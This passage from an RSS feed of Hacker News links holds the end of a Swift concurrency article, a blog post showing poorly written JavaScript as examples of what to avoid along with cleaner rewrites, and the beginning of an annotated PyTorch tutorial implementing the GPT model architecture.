</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>
</span><span>  </span><span>static</span><span> </span><span>func</span><span> </span><span>checkCancellation</span><span>()</span><span> </span><span>async</span><span> </span><span>throws</span><span>
</span><span>}</span></code></pre>
    </div>
<p>Why do you need to call these functions instead of the concurrency runtime just cancelling tasks
automatically? The runtime doesn’t know what your task is doing, it may need to save and close a
file handle, save the state of an expensive computation, or do whatever cleanup is needed.
Cancelling tasks preemptively would lead to much more complexity, while forcing tasks to account
for possible cancellation at any arbitrary line of code.</p>
<p>A <code>try await Task.checkCancellation()</code> call executed within a task will throw
<code>Task.CancellationError</code> if this task was previously cancelled, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://desiatov.com/swift-structured-concurrency-introduction">https://desiatov.com/swift-structured-concurrency-introduction</a></em></p>]]>
            </description>
            <link>https://desiatov.com/swift-structured-concurrency-introduction</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776245</guid>
            <pubDate>Thu, 14 Jan 2021 13:54:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst pieces of code I’ve ever seen]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776220">thread link</a>) | @scastiel
<br/>
January 14, 2021 | https://www.jesuisundev.com/en/the-worst-pieces-of-code/ | <a href="https://web.archive.org/web/*/https://www.jesuisundev.com/en/the-worst-pieces-of-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			
<!-- Horizontal Top Article -->
<p>Today, I’m going to show you the worst pieces of code I’ve ever seen. Some devilries that should never be produced! Unless you want to be hated by your colleagues and your users. We’ll see that with a few good practices, it’s easy to avoid them.</p>



<h3>Devilry</h3>



<p><strong>There’s a difference between code that needs to be improved and what I call a devilry.</strong></p>



<p>No matter the language, a devilry is a dirty piece of code that endangers the stability and maintainability of the project. And I can tell you that I’ve seen a lot of devilry.</p>



<p>When it piles up, your project quickly becomes like the basement of hell. And if you’re the one who’s making a mess everywhere, the lead tech in the kitchen is going to start looking at you differently.</p>



<figure><img src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F06.2F05.2F4ba31c44-4b82-42c0-97cf-b528db6fc8a4.2Ejpeg/2048x1152/quality/80/cauchemar-en-cuisine-un-candidat-raconte-l-apocalypse-du-tournage-avec-philippe-etchebest.jpeg" data-src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F06.2F05.2F4ba31c44-4b82-42c0-97cf-b528db6fc8a4.2Ejpeg/2048x1152/quality/80/cauchemar-en-cuisine-un-candidat-raconte-l-apocalypse-du-tournage-avec-philippe-etchebest.jpeg" alt=""></figure>



<h3>Ambiguity and inconsistency</h3>



<p><strong>A long time ago, in a galaxy far, far away</strong>, I arrived one morning and was jumped on as if it was the end of the world.</p>



<p>A huge bug in prod. All the system tickets in production return “null” for no reason. <strong>Chaos everywhere. </strong>Everyone was running around like headless chickens.</p>



<p>I sprint to my station and first reflex, I look at Kibana. No logs.No nothing. Fuck, this is not a good start.</p>



<p>So I decide to retrace the path of creation of the ticket.</p>



<p>To do so, I have to go into the depths of internals libraries that have been around since the Jurassic era. At the end of my archaeological work, I arrive in one of the responsible files.</p>



<p><strong>And i saw this</strong></p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// use id and expire to get ticket
async function get_ticket(i, expire) {
  return CheckisNotExp(expire).then(async function() {
    var t = await GetTicketModel(i)
    if (t) {
      return t
    } else {
      logger.error(JSON.stringify(t))
      return null
    }
  }).catch(async function(e)  {
      logger.error(JSON.stringify(e))
      return null
})
}</pre>



<figure id="block-a351ed13-b796-4b89-ad82-7c679c353d72"><img src="https://pbs.twimg.com/media/ETkK_9DXkAEmUlg.jpg" data-src="https://pbs.twimg.com/media/ETkK_9DXkAEmUlg.jpg" alt="oof"></figure>



<p><em>Is there really an “i” variable ? Where are we now? That’s an id, right? Integer or UUID? And what exactly is expire? Is it a date or a timestamp? Why is there camelCase, PascalCase and snake_case? Async notation with promises and async notation again? If something fails we return null? DEVILRY!</em></p>



<hr>



<p>At this moment, half the company Skype me every 5 minutes to get an ETA for the fix.</p>



<p><strong>So first, git blame, someone need to know what’s going on here.</strong></p>



<p>I quickly realized that it’s not one person who is responsible, but three. Two people have left the company a long time ago, the third hasn’t arrived yet this morning. Classic scenario.</p>



<p>According to Git, these three people have touched this file at very distant times. Hence the inconsistency, the different styles, the different ECMAScript versions and the different ways of handling promises.</p>



<p>I take this opportunity to suggest you the best conference on promises I’ve ever seen.</p>



<figure><p>
<iframe title="Broken Promises" width="940" height="529" src="https://www.youtube.com/embed/e3Nh350b6S4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p><strong>I was in the room at this conference!</strong> I know, nobody care.</p>



<p>Anyway, in this piece of code, everything is ambiguous, everything is inconsistent. <strong>It’s a perfect example of what you should avoid at all costs.</strong> Needless to say, the code review didn’t go through that.</p>



<p><strong>Well now, we have to rewrite this quickly.</strong></p>



<p>I’m changing the names of the variables and functions. No ambiguity allowed. Async / Await everywhere and in the same way.</p>



<p>I’m also making sure I don’t hide any errors under the mat with a null return. These errors must break the function if something goes wrong. Exceptions should be handled by the layer above.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// hotfix
// @todo rewrite the ticket module entirely
async function getTicket(ticketUuid, ticketExpirationTimestamp) {
  await validTicketExpiration(ticketUuid, ticketExpirationTimestamp)
  const ticket = await getTicketByUuid(ticketUuid)

  return ticket
}</pre>



<p>The really good solution would be to rewrite part of the module. <strong>The ticket validation logic is bad here.</strong> But it’s not urgent.</p>



<p>The urgency is to spot and fix the error.</p>



<p>And right after updating the code, the real error starts to show its face. <strong>A configuration change made the day before had changed the ticket creation behavior.</strong> Returning to the previous configuration immediately fixed the problem.</p>



<p>The following week, the module in question was completely rewritten.</p>



<h3>Spaghetti Bolognese</h3>



<p><strong>A long time ago, in a galaxy far, far away</strong>, I was working on a product with a clean, square code.</p>



<p>Like any good product, everything was optimized inside. Features made with as little code as possible. A strong attention to readability. A strict follow up of all good practices ensured by a code review managed by clean code nazis.</p>



<p><a href="https://www.youtube.com/watch?v=rtmFCcjEgEw" target="_blank" rel="noreferrer noopener">SOLID</a>, <a href="https://thevaluable.dev/dry-principle-cost-benefit-example/" target="_blank" rel="noreferrer noopener">DRY</a>, <a href="https://dzone.com/articles/software-design-principles-dry-and-kiss" target="_blank" rel="noreferrer noopener">KISS</a>, <a href="https://medium.com/better-programming/yagni-you-aint-gonna-need-it-f9a178cd8e1" target="_blank" rel="noreferrer noopener">YAGNI</a> and every other acronym you can think of.</p>



<p>It was so clean, you could have eaten off the floor.</p>



<p><strong>Even so, a very specific part of the product would break intermittently.</strong></p>



<figure><img src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F11.2F27.2F6ead848d-34f3-49f8-ac8a-c7be1999e7b8.2Ejpeg/753x565/cr/wqkgTTYgLyBWb2ljaQ%3D%3D/focus-point/919%2C651/video-objectif-top-chef-philippe-etchebest-perturbe-par-une-candidate-americaine-de-54-ans.jpg" data-src="https://voi.img.pmdstatic.net/fit/http.3A.2F.2Fprd2-bone-image.2Es3-website-eu-west-1.2Eamazonaws.2Ecom.2Fvoi.2F2019.2F11.2F27.2F6ead848d-34f3-49f8-ac8a-c7be1999e7b8.2Ejpeg/753x565/cr/wqkgTTYgLyBWb2ljaQ%3D%3D/focus-point/919%2C651/video-objectif-top-chef-philippe-etchebest-perturbe-par-une-candidate-americaine-de-54-ans.jpg" alt=""></figure>



<p>During a sprint, I eventually managed to negotiate time to investigate the case.</p>



<p>Very quickly, I realize that the problem is not the product. <strong>Errors have only one thing in common: a dependency.</strong> An internal dependency solved via an internal <a href="https://jfrog.com/artifactory/" target="_blank" rel="noreferrer noopener">artifactory</a>.</p>



<p>It is managed by another team and – very surprisingly – the code is not freely available. You have to ask a permission to see it. So I ask for access to understand what’s going on.</p>



<p><strong>I then receive a slack message or I’m asked why I want access.</strong></p>



<p>“-Hi! Why do you need access on this repository ?”<br>“-What do you mean why? Are you aware that I work here? Hold on, I’m on my way.”</p>



<p>After a surprise armlock on the person, I end up having access to the project.</p>



<p>I see a single file in it. 300 Ko in size. 300 Ko of text, it’s huge. It hasn’t been touched for several years. The name of the person who last touched it is completely unknown to me.</p>



<p>The worst devilry.</p>



<p><strong>The biggest spaghetti code I’ve ever seen in my life.</strong> For the sake of length, and to preserve your sanity, I’m not putting everything in. Just a very short excerpt of what I saw inside.</p>



<p>Careful, it stings the eyes.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Thousands of lines of spaghetti codes

if (global.Builder)
{
    module.exports.buildPgs = function(pgs, options, limitNodes = 0)
    {
        var config = options.config || {};
        var builded = [];
        pgs.each(function(pg)
        {
            var supported = pg.prop('tagName') == "INPUT"
                            &amp;&amp; pr.attr['name'] == "file"
                            &amp;&amp; options.pgs.rel.active == ""
                            &amp;&amp; global.FileReader;
            if (!supported || !pg.f || pg.f.length == 0)
                return;
            
            for (var i = 0; i &lt; pg.f.length; i++)
            {
                builded.push({
                    file: pg.f[i],
                    instanceConfig: _.extend({}, config)
                });
                
                if (isFunction(options.before))
                {
                    var returned = options.before(pg.f.path);
                    if (typeof returned === 'object' &amp;&amp; global.status.in_progress)
                    {
                        if (returned.action == "skip")
                        {
                            var needsSkip = (typeof global.status.in_progress === 'boolean' &amp;&amp; global.status.in_progress)
                                            || _.hasAny("cancel", Global._quotes.BAD_DELIMITERS)
                                            || str.indexOf(Global._delimiter) &gt; -1;
                            
                            if(needsSkip) return;
                        }
                        else if (typeof returned.config === 'object')
                        {
                            var LOCAL_BUILDER = new global.Builder("/builder/" + options.module + "/" + options.module + );
                            
                            for(var s=p,a=p.matchIndex(o),shift=0,i=0;i&lt;a.length;i++){
                                var deepcopyfile = JSON.parse(JSON.stringify(pg.f[i].getRawValue()));
                                LOCAL_BUILDER.build(deepcopyfile)
                                LOCAL_BUILDER.onmessage = global.Notification("buildPg", deepcopyfile);
                            }
                        }
                    }
                }
            }
        });
    }
}

// Thousands of lines of spaghetti codes</pre>



<figure><img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20210%20140%22%3E%3C/svg%3E" data-src="https://s.yimg.com/ny/api/res/1.2/PHY850kbet.Llr9vBQvkHQ--~A/YXBwaWQ9aGlnaGxhbmRlcjtzbT0xO3c9ODAw/https://media.zenfs.com/fr/voici.fr/11e2b5d91a77141eacac3c01306619ed" alt=""></figure>



<p><strong>I didn’t even try to touch this demon child.</strong></p>



<p>In a case like this, the solution is not through the code. I called a meeting with my team araound a table to explain the situation. My plan was simple.</p>



<p><strong>We don’t touch it. </strong></p>



<p>We replace this satanic dependency with an open-source module that is already available. As always, there was a major problem. It was necessary to work a little to plug the new dependency correctly.</p>



<p>The rapid investigation was turning into a big task of several days.</p>



<p><strong>The scrum master at the other end of the table was furious.</strong> The more the discussion went on, the more I felt that it was going to be difficult to avoid touching the damn thing. And as I presented it, the discussion ended with a no.</p>



<p><em>“You just touch the minimum to fix the module and we’ll move on.”</em></p>



<p>So I did what developers should do more for code quality and sustainability of projects over time. <strong>I said no.</strong> I even went further.</p>



<p>For the first and only time in my career, I said I was ready to resign if I was forced to.</p>



<p>They obviously asked other developers. <strong>Everyone refused.</strong></p>



<p>Because of the seriousness of all this, I was given time to replace the module. I developed a <a href="https://refactoring.guru/design-patterns/adapter" target="_blank" rel="noreferrer noopener">small adapter</a> for the open source dependency. Then I got rid of the cursed dependency.</p>



<p>The product worked like a charm after that.</p>



<p>If developers talk so much about spaghetti code, there’s a good reason for that. <strong>It’s the worst kind of code you can work on. </strong></p>



<p>It doesn’t require a huge investment to make sure you avoid it.</p>



<h3>Exorcism</h3>



<p>Originally, this article was intended to be a list of best practices.</p>



<p><em>“Why and how to apply good practices as a developer.”</em></p>



<p>Apart from the fact that this title has the same effect as a high-dose sleeping pill, I changed my plans for two reasons.</p>



<p>First, I find it more interesting – for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jesuisundev.com/en/the-worst-pieces-of-code/">https://www.jesuisundev.com/en/the-worst-pieces-of-code/</a></em></p>]]>
            </description>
            <link>https://www.jesuisundev.com/en/the-worst-pieces-of-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776220</guid>
            <pubDate>Thu, 14 Jan 2021 13:52:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GPT-2 architecture implementation with notes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25775925">thread link</a>) | @vpj
<br/>
January 14, 2021 | https://lab-ml.com/labml_nn/transformers/gpt/ | <a href="https://web.archive.org/web/*/https://lab-ml.com/labml_nn/transformers/gpt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
    
    
    <div id="section-0">
        <div>
                
                
<p>This is an tutorial of
<a href="https://openai.com/blog/better-language-models/">OpenAI GPT architecture</a>.
We got a bunch of implementation details from
<a href="https://github.com/karpathy/minGPT">minGPT</a>
by <a href="https://twitter.com/karpathy">@karpathy</a>.
This implementation also uses character tiny shakespeare dataset.</p>
<p>GPT model is essentially a standard transformer with a few tweaks.
GPT-2 and especially GPT-3 models are quite large and won’t fit on a
single GPU and will need model parallelism.
This implementation doesn’t even use data parallelism and is intended to be
more of a tutorial.</p>
<p>Main differences of this to a standard autoregressive transformer
are the parameter initialization, weight decay, and learning rate schedule.
For the transformer we reuse the
<a href="https://lab-ml.com/labml_nn/transformers/">existing labml/nn transformer implementation</a>.</p>
<p>Here’s a notebook for training a GPT model on Tiny Shakespeare dataset.</p>
<p><a href="https://colab.research.google.com/github/lab-ml/nn/blob/master/labml_nn/transformers/gpt/experiment.ipynb"><img alt="Open In Colab" src="https://colab.research.google.com/assets/colab-badge.svg"></a>
<a href="https://web.lab-ml.com/run?uuid=0324c6d0562111eba65d0242ac1c0002"><img alt="View Run" src="https://img.shields.io/badge/labml-experiment-brightgreen"></a></p>
            </div>
            <div>
                <div><pre><span>34</span><span></span><span>import</span> <span>torch</span>
<span>35</span><span>from</span> <span>torch</span> <span>import</span> <span>nn</span>
<span>36</span>
<span>37</span><span>from</span> <span>labml</span> <span>import</span> <span>experiment</span>
<span>38</span><span>from</span> <span>labml.configs</span> <span>import</span> <span>option</span>
<span>39</span><span>from</span> <span>labml_helpers.module</span> <span>import</span> <span>Module</span>
<span>40</span><span>from</span> <span>labml_nn.experiments.nlp_autoregression</span> <span>import</span> <span>NLPAutoRegressionConfigs</span>
<span>41</span><span>from</span> <span>labml_nn.optimizers.configs</span> <span>import</span> <span>OptimizerConfigs</span>
<span>42</span><span>from</span> <span>labml_nn.transformers</span> <span>import</span> <span>TransformerConfigs</span><span>,</span> <span>Encoder</span>
<span>43</span><span>from</span> <span>labml_nn.transformers.utils</span> <span>import</span> <span>subsequent_mask</span></pre></div>
            </div>
        </div>
    <div id="section-1">
        <div>
                
                <h2>GPT model</h2>
<p>This consists of a token embedding layer, transformer encoder, and
a final linear layer that gives token logits.</p>
            </div>
            
        </div>
    <div id="section-2">
        
            <div>
                <div><pre><span>54</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>encoder</span><span>:</span> <span>Encoder</span><span>,</span> <span>src_embed</span><span>:</span> <span>Module</span><span>,</span> <span>generator</span><span>:</span> <span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-3">
            
            <div>
                <div><pre><span>61</span>        <span>super</span><span>()</span><span>.</span><span>__init__</span><span>()</span>
<span>62</span>        <span>self</span><span>.</span><span>src_embed</span> <span>=</span> <span>src_embed</span>
<span>63</span>        <span>self</span><span>.</span><span>encoder</span> <span>=</span> <span>encoder</span>
<span>64</span>        <span>self</span><span>.</span><span>generator</span> <span>=</span> <span>generator</span></pre></div>
            </div>
        </div>
    <div id="section-4">
            <div>
                
                <p>The mask will be initialized on the first call</p>
            </div>
            
        </div>
    <div id="section-5">
            
            <div>
                <div><pre><span>69</span>    <span>def</span> <span>__call__</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-6">
            <div>
                
                <p>Create subsequent mask if mask is not initialized
or if the size of the mask is different</p>
            </div>
            <div>
                <div><pre><span>72</span>        <span>if</span> <span>self</span><span>.</span><span>mask</span> <span>is</span> <span>None</span> <span>or</span> <span>self</span><span>.</span><span>mask</span><span>.</span><span>size</span><span>(</span><span>0</span><span>)</span> <span>!=</span> <span>len</span><span>(</span><span>x</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-7">
            <div>
                
                <p>Subsequent mask, will mask out tokens from seeing future tokens</p>
            </div>
            <div>
                <div><pre><span>74</span>            <span>self</span><span>.</span><span>mask</span> <span>=</span> <span>subsequent_mask</span><span>(</span><span>len</span><span>(</span><span>x</span><span>))</span><span>.</span><span>to</span><span>(</span><span>x</span><span>.</span><span>device</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-8">
            <div>
                
                <p>Get the token embeddings with positional encodings</p>
            </div>
            
        </div>
    <div id="section-9">
            
            <div>
                <div><pre><span>78</span>        <span>x</span> <span>=</span> <span>self</span><span>.</span><span>encoder</span><span>(</span><span>x</span><span>,</span> <span>self</span><span>.</span><span>mask</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-11">
            <div>
                
                <p>Return results
(second value is for state, since our trainer is used with RNNs also)</p>
            </div>
            
        </div>
    <div id="section-12">
        
            <div>
                <div><pre><span>87</span><span>class</span> <span>Configs</span><span>(</span><span>NLPAutoRegressionConfigs</span><span>):</span></pre></div>
            </div>
        </div>
    
    <div id="section-14">
            
            <div>
                <div><pre><span>98</span>    <span>transformer</span><span>:</span> <span>TransformerConfigs</span></pre></div>
            </div>
        </div>
    <div id="section-15">
            
            <div>
                <div><pre><span>100</span>    <span>weight_decay</span><span>:</span> <span>float</span> <span>=</span> <span>0.1</span></pre></div>
            </div>
        </div>
    <div id="section-16">
            <div>
                
                <p>Number of tokens for wamup</p>
            </div>
            <div>
                <div><pre><span>102</span>    <span>warmup_steps</span><span>:</span> <span>int</span> <span>=</span> <span>128</span> <span>*</span> <span>128</span> <span>*</span> <span>20</span></pre></div>
            </div>
        </div>
    <div id="section-17">
            
            <div>
                <div><pre><span>105</span>    <span>optimizer</span> <span>=</span> <span>'transformer_optimizer'</span></pre></div>
            </div>
        </div>
    <div id="section-18">
        <div>
                
                <h3>Transformer configurations</h3>
            </div>
            <div>
                <div><pre><span>108</span><span>@option</span><span>(</span><span>Configs</span><span>.</span><span>transformer</span><span>,</span> <span>'GPT'</span><span>)</span>
<span>109</span><span>def</span> <span>_transformer_configs</span><span>(</span><span>c</span><span>:</span> <span>Configs</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-19">
            
            <div>
                <div><pre><span>116</span>    <span>conf</span> <span>=</span> <span>TransformerConfigs</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-20">
            <div>
                
                <p>Set the vocabulary sizes for embeddings and generating logits</p>
            </div>
            <div>
                <div><pre><span>118</span>    <span>conf</span><span>.</span><span>n_src_vocab</span> <span>=</span> <span>c</span><span>.</span><span>n_tokens</span>
<span>119</span>    <span>conf</span><span>.</span><span>n_tgt_vocab</span> <span>=</span> <span>c</span><span>.</span><span>n_tokens</span></pre></div>
            </div>
        </div>
    <div id="section-21">
            <div>
                
                <p>GPT uses GELU activation for position wise feedforward</p>
            </div>
            <div>
                <div><pre><span>121</span>    <span>conf</span><span>.</span><span>feed_forward_activation</span> <span>=</span> <span>'GELU'</span></pre></div>
            </div>
        </div>
    
    <div id="section-23">
        <div>
                
                <h3>Initialize weights</h3>
<p>Weights of linear layers and embedding layers are initialized
to $\mathcal{N}(0, 0.02)$
instead of the default Xavier initialzation.</p>
            </div>
            <div>
                <div><pre><span>127</span><span>def</span> <span>_init_weights</span><span>(</span><span>module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-24">
            
            <div>
                <div><pre><span>136</span>    <span>if</span> <span>not</span> <span>isinstance</span><span>(</span><span>module</span><span>,</span> <span>(</span><span>nn</span><span>.</span><span>Linear</span><span>,</span> <span>nn</span><span>.</span><span>Embedding</span><span>)):</span>
<span>137</span>        <span>return</span>
<span>138</span>
<span>139</span>    <span>module</span><span>.</span><span>weight</span><span>.</span><span>data</span><span>.</span><span>normal_</span><span>(</span><span>mean</span><span>=</span><span>0.0</span><span>,</span> <span>std</span><span>=</span><span>0.02</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-25">
            
            <div>
                <div><pre><span>142</span>    <span>if</span> <span>isinstance</span><span>(</span><span>module</span><span>,</span> <span>nn</span><span>.</span><span>Linear</span><span>)</span> <span>and</span> <span>module</span><span>.</span><span>bias</span> <span>is</span> <span>not</span> <span>None</span><span>:</span>
<span>143</span>        <span>module</span><span>.</span><span>bias</span><span>.</span><span>data</span><span>.</span><span>zero_</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-26">
        <div>
                
                <p>Create GPT model and initialize weights</p>
            </div>
            <div>
                <div><pre><span>146</span><span>@option</span><span>(</span><span>Configs</span><span>.</span><span>model</span><span>)</span>
<span>147</span><span>def</span> <span>_model</span><span>(</span><span>c</span><span>:</span> <span>Configs</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-27">
            
            <div>
                <div><pre><span>151</span>    <span>m</span> <span>=</span> <span>GPT</span><span>(</span><span>c</span><span>.</span><span>transformer</span><span>.</span><span>encoder</span><span>,</span>
<span>152</span>            <span>c</span><span>.</span><span>transformer</span><span>.</span><span>src_embed</span><span>,</span>
<span>153</span>            <span>c</span><span>.</span><span>transformer</span><span>.</span><span>generator</span><span>)</span><span>.</span><span>to</span><span>(</span><span>c</span><span>.</span><span>device</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-28">
            <div>
                
                <p>Apply custom weight initialization</p>
            </div>
            <div>
                <div><pre><span>156</span>    <span>m</span><span>.</span><span>apply</span><span>(</span><span>_init_weights</span><span>)</span>
<span>157</span>
<span>158</span>    <span>return</span> <span>m</span></pre></div>
            </div>
        </div>
    <div id="section-29">
        <div>
                
                <h3>Create custom optimizer with weight decay</h3>
<p>This code is taken from <a href="https://github.com/karpathy/minGPT">minGPT</a>.
This applies weight decay only to weights of linear layers.</p>
            </div>
            <div>
                <div><pre><span>161</span><span>@option</span><span>(</span><span>NLPAutoRegressionConfigs</span><span>.</span><span>optimizer</span><span>)</span>
<span>162</span><span>def</span> <span>transformer_optimizer</span><span>(</span><span>c</span><span>:</span> <span>NLPAutoRegressionConfigs</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-30">
            <div>
                
                <p>Collect names of parameters to apply weight decay</p>
            </div>
            <div>
                <div><pre><span>170</span>    <span>decay</span> <span>=</span> <span>set</span><span>()</span>
<span>171</span>    <span>for</span> <span>mn</span><span>,</span> <span>m</span> <span>in</span> <span>c</span><span>.</span><span>model</span><span>.</span><span>named_modules</span><span>():</span>
<span>172</span>        <span>for</span> <span>pn</span><span>,</span> <span>p</span> <span>in</span> <span>m</span><span>.</span><span>named_parameters</span><span>():</span>
<span>173</span>            <span>fpn</span> <span>=</span> <span>f</span><span>'</span><span>{</span><span>mn</span><span>}</span><span>.</span><span>{</span><span>pn</span><span>}</span><span>'</span> <span>if</span> <span>mn</span> <span>else</span> <span>pn</span>  <span># full param name</span>
<span>174</span>
<span>175</span>            <span>if</span> <span>fpn</span><span>.</span><span>endswith</span><span>(</span><span>'weight'</span><span>)</span> <span>and</span> <span>isinstance</span><span>(</span><span>m</span><span>,</span> <span>nn</span><span>.</span><span>Linear</span><span>):</span>
<span>176</span>                <span>decay</span><span>.</span><span>add</span><span>(</span><span>fpn</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-31">
            
            <div>
                <div><pre><span>179</span>    <span>param_dict</span> <span>=</span> <span>{</span><span>pn</span><span>:</span> <span>p</span> <span>for</span> <span>pn</span><span>,</span> <span>p</span> <span>in</span> <span>c</span><span>.</span><span>model</span><span>.</span><span>named_parameters</span><span>()}</span></pre></div>
            </div>
        </div>
    <div id="section-32">
            <div>
                
                <p>Parameters that are not decayed</p>
            </div>
            <div>
                <div><pre><span>181</span>    <span>no_decay</span> <span>=</span> <span>set</span><span>(</span><span>param_dict</span><span>.</span><span>keys</span><span>())</span> <span>-</span> <span>decay</span></pre></div>
            </div>
        </div>
    <div id="section-33">
            <div>
                
                <p>create the pytorch optimizer object</p>
            </div>
            <div>
                <div><pre><span>184</span>    <span>opt_groups</span> <span>=</span> <span>[</span>
<span>185</span>        <span>{</span><span>"params"</span><span>:</span> <span>[</span><span>param_dict</span><span>[</span><span>pn</span><span>]</span> <span>for</span> <span>pn</span> <span>in</span> <span>sorted</span><span>(</span><span>list</span><span>(</span><span>decay</span><span>))],</span> <span>"weight_decay"</span><span>:</span> <span>c</span><span>.</span><span>weight_decay</span><span>},</span>
<span>186</span>        <span>{</span><span>"params"</span><span>:</span> <span>[</span><span>param_dict</span><span>[</span><span>pn</span><span>]</span> <span>for</span> <span>pn</span> <span>in</span> <span>sorted</span><span>(</span><span>list</span><span>(</span><span>no_decay</span><span>))],</span> <span>"weight_decay"</span><span>:</span> <span>0.0</span><span>},</span>
<span>187</span>    <span>]</span></pre></div>
            </div>
        </div>
    <div id="section-34">
            
            <div>
                <div><pre><span>192</span>    <span>optimizer</span> <span>=</span> <span>OptimizerConfigs</span><span>()</span></pre></div>
            </div>
        </div>
    <div id="section-35">
            <div>
                
                <p>Set parameter groups for optimization</p>
            </div>
            <div>
                <div><pre><span>195</span>    <span>optimizer</span><span>.</span><span>parameters</span> <span>=</span> <span>opt_groups</span></pre></div>
            </div>
        </div>
    <div id="section-36">
            
            <div>
                <div><pre><span>198</span>    <span>optimizer</span><span>.</span><span>optimizer</span> <span>=</span> <span>'AdamWarmupCosineDecay'</span></pre></div>
            </div>
        </div>
    <div id="section-37">
            <div>
                
                <p>Set model embedding size, required if we use <a href="https://lab-ml.com/labml_nn/transformers/optimizers/noam.html">Noam optimizer</a>
which has an exponential decay</p>
            </div>
            <div>
                <div><pre><span>201</span>    <span>optimizer</span><span>.</span><span>d_model</span> <span>=</span> <span>c</span><span>.</span><span>d_model</span></pre></div>
            </div>
        </div>
    <div id="section-38">
            <div>
                
                <p>Set default weight decay.
This is not required since we set the weight decay in the parameter groups</p>
            </div>
            <div>
                <div><pre><span>204</span>    <span>optimizer</span><span>.</span><span>weight_decay</span> <span>=</span> <span>c</span><span>.</span><span>weight_decay</span></pre></div>
            </div>
        </div>
    <div id="section-39">
            <div>
                
                <p>GPT uses a maximum learning rate of $6 \times 10^{-4}$</p>
            </div>
            <div>
                <div><pre><span>206</span>    <span>optimizer</span><span>.</span><span>learning_rate</span> <span>=</span> <span>6e-4</span></pre></div>
            </div>
        </div>
    <div id="section-40">
            <div>
                
                <p>$\beta_1 = 0.9, \beta_2 = 0.95$</p>
            </div>
            <div>
                <div><pre><span>208</span>    <span>optimizer</span><span>.</span><span>betas</span> <span>=</span> <span>(</span><span>0.9</span><span>,</span> <span>0.95</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-42">
            <div>
                
                <p>Weight decay decoupled from gradients</p>
            </div>
            <div>
                <div><pre><span>212</span>    <span>optimizer</span><span>.</span><span>weight_decouple</span> <span>=</span> <span>True</span></pre></div>
            </div>
        </div>
    <div id="section-43">
            <div>
                
                <p>Total number of optimization steps for learning rate cosine decay</p>
            </div>
            <div>
                <div><pre><span>214</span>    <span>optimizer</span><span>.</span><span>total_steps</span> <span>=</span> <span>c</span><span>.</span><span>epochs</span> <span>*</span> <span>len</span><span>(</span><span>c</span><span>.</span><span>text</span><span>.</span><span>train</span><span>)</span> <span>//</span> <span>(</span><span>c</span><span>.</span><span>batch_size</span> <span>*</span> <span>c</span><span>.</span><span>seq_len</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-44">
            <div>
                
                <p>Number of warmup optimization steps</p>
            </div>
            <div>
                <div><pre><span>216</span>    <span>optimizer</span><span>.</span><span>warmup</span> <span>=</span> <span>c</span><span>.</span><span>warmup_steps</span> <span>//</span> <span>(</span><span>c</span><span>.</span><span>batch_size</span> <span>*</span> <span>c</span><span>.</span><span>seq_len</span><span>)</span>
<span>217</span>
<span>218</span>    <span>return</span> <span>optimizer</span></pre></div>
            </div>
        </div>
    
    <div id="section-46">
            
            <div>
                <div><pre><span>223</span>    <span>experiment</span><span>.</span><span>create</span><span>(</span><span>name</span><span>=</span><span>"gpt"</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-48">
            
            <div>
                <div><pre><span>227</span>    <span>experiment</span><span>.</span><span>configs</span><span>(</span><span>conf</span><span>,</span> <span>{</span></pre></div>
            </div>
        </div>
    <div id="section-49">
            <div>
                
